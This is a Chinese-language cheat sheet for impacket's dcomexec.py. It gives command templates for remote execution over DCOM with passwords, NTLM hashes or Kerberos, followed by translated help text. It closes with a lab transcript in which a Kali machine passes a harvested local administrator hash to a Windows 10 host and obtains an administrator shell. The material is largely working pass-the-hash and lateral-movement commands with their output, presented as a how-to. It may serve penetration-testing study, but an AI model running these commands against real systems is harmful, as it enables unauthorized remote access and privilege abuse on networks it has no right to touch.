
# impacket-dcomexec
<div style="text-align: right;">

date: "2023-12-10"

</div>

## 工具特点

可使用密码认证、hash认证、kerberos认证。一般使用MMC20，而且DCOM有时候会遇到0x800706ba的错误，一般都是被防火墙拦截。

## 基础使用

域环境下传递密码

```shell
python3 dcomexec.py -object {ShellWindows,ShellBrowserWindow,MMC20} <domain>/<username>:<password>@<ip> "<command>"
```

本地环境下传递密码

```shell
python3 dcomexec.py -object {ShellWindows,ShellBrowserWindow,MMC20} ./<username>:<password>@<ip> "<command>"
```

域环境下传递Hash

```shell
python3 dcomexec.py -object {ShellWindows,ShellBrowserWindow,MMC20} -hashes :<hash> <domain>/<username>@<ip> "<command>"
```

本地环境下传递Hash

```shell
python3 dcomexec.py -object {ShellWindows,ShellBrowserWindow,MMC20} -hashes :<hash> ./<username>@<ip> "<command>"
```

## 参数说明

```shell
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

usage: dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC]
                   [-object [{ShellWindows,ShellBrowserWindow,MMC20}]]
                   [-com-version MAJOR_VERSION:MINOR_VERSION] [-shell-type {cmd,powershell}]
                   [-silentcommand] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                   [-dc-ip ip address] [-A authfile] [-keytab KEYTAB]
                   target [command [command ...]]

使用 ShellBrowserWindow DCOM 对象执行半交互式 shell。

位置参数:
  target                [[域/]用户名[:密码]@]<目标名称或地址>
  command               在目标处执行的命令。 如果为空，它将启动一个半交互式 shell

可选参数:
  -h, --help            显示此帮助消息并退出
  -share SHARE          共享将从哪里获取输出（默认 ADMIN$）
  -nooutput             是否打印输出（未创建 SMB 连接）
  -ts                   为每个日志输出添加时间戳
  -debug                打开 DEBUG 输出
  -codec CODEC          设置目标输出中使用的编码（编解码器）（默认“utf-8”）。 如果检测到错误，请在目标上运行 chcp.com，将结果映射到 https://docs.python.org/3/library/codecs.html#standard-encodings，然后使用 -codec 和 -codec 再次执行 smbexec.py 相应的编解码器
  -object [{ShellWindows,ShellBrowserWindow,MMC20}]
                        用于执行 shell 命令的 DCOM 对象（默认=ShellWindows）
  -com-version MAJOR_VERSION:MINOR_VERSION
                        DCOM 版本，格式为 MAJOR_VERSION:MINOR_VERSION 例如 5.7
  -shell-type {cmd,powershell}
                        为半交互式 shell 选择命令处理器
  -silentcommand        不执行 cmd.exe 来运行给定命令（无输出，无法运行 dir/cd/etc.）

认证:
  -hashes LMHASH:NTHASH
                        NTLM 哈希值，格式为 LMHASH:NTHASH
  -no-pass              不询问密码（对于 -k 很有用）
  -k                    使用 Kerberos 身份验证。 根据目标参数从 ccache 文件 (KRB5CCNAME) 获取凭据。 如果找不到有效的凭据，它将使用命令行中指定的凭据
  -aesKey hex key       用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）
  -dc-ip ip address     域控制器的 IP 地址。 如果省略，则使用目标参数中指定的域部分 (FQDN)
  -A authfile           smbclient/mount.cifs 样式的身份验证文件。 请参阅 smbclient 手册页的 -A 选项。
  -keytab KEYTAB        从 keytab 文件中读取 SPN 的密钥
```

## 实验环境

在其它机器上收集到Win10机器的Hash密码进行横向传递

| 机器  | IP             | 状态                       |
| ----- | -------------- | -------------------------- |
| Win10 | 192.168.36.130 | 知道本地管理员用户的Hash值 |
| Kali  | 192.168.36.128 |                            |

```shell
┌──(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ python3 dcomexec.py -object MMC20 -hashes :579da618cfbfa85247acf1f800a280a4 administrator@192.168.36.130
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
desktop-2jrvags\administrator

C:\>
┌──(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ python3 dcomexec.py -object MMC20 -hashes :579da618cfbfa85247acf1f800a280a4 administrator@192.168.36.130 "whoami"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
desktop-2jrvags\administrator
```